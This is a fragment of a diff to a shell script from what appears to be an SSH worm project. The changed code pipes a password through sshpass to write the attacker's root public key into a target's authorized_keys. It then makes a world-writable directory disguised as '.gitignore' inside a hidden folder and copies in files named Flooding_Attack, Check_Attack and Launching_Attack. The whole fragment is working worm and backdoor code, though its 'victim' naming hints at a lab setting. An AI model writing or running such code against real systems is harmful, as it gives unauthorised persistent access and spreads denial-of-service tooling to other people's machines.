@@ -31,7 +31,8 @@ SSH_PATH="/home/victim/.ssh"
 #fi
 
 # sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/
-(echo "victim\r")|sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/authorized_keys
+#(echo "victim\r")|
+sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/authorized_keys
 #####
 
 ssh victim@"$IP_Address" 'Hidden1="/home/victim/.etc/.gitignore"; mkdir -p $Hidden1; chmod 777 $Hidden1; cp /home/victim/Desktop/ssh_worm/Infect/Flooding_Attack $Hidden1; cp /home/victim/Desktop/ssh_worm/Infect/Check_Attack $Hidden1; cp /home/victim/Desktop/ssh_worm/Infect/Launching_Attack $Hidden1 > /dev/null 2>&1'
